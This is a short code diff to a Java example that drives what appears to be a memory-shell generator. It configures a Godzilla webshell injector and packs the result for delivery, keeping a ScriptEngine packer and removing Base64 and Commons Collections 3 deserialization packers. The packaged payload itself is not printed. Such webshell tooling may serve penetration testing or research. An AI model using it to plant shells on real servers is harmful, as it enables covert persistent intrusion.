@@ -1,10 +1,14 @@
 package com.reajason.javaweb;
 
-import com.reajason.javaweb.memshell.*;
-import com.reajason.javaweb.memshell.config.GenerateResult;
+import com.reajason.javaweb.Server;
+import com.reajason.javaweb.memshell.MemShellGenerator;
+import com.reajason.javaweb.memshell.MemShellResult;
+import com.reajason.javaweb.memshell.ShellTool;
+import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.config.GodzillaConfig;
 import com.reajason.javaweb.memshell.config.InjectorConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
+import com.reajason.javaweb.packer.Packers;
 
 /**
  * @author ReaJason
@@ -33,18 +37,13 @@ public class Godzilla {
 //                .headerValue("test")
                 .build();
 
-        GenerateResult result = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);
+        MemShellResult result = MemShellGenerator.generate(shellConfig, injectorConfig, godzillaConfig);
 
         System.out.println("注入器类名：" + result.getInjectorClassName());
         System.out.println("内存马类名：" + result.getShellClassName());
 
         System.out.println(result.getShellConfig());
         System.out.println(result.getShellToolConfig());
-
-        System.out.println("Base64 打包：" + Packers.Base64.getInstance().pack(result));
-
-        System.out.println("脚本引擎打包：" + Packers.ScriptEngine.getInstance().pack(result));
-
-        System.out.println("CC3 打包：" + Packers.JavaCommonsCollections3.getInstance().pack(result));
+        System.out.println("脚本引擎打包：" + Packers.ScriptEngine.getInstance().pack(result.toClassPackerConfig()));
     }
 }
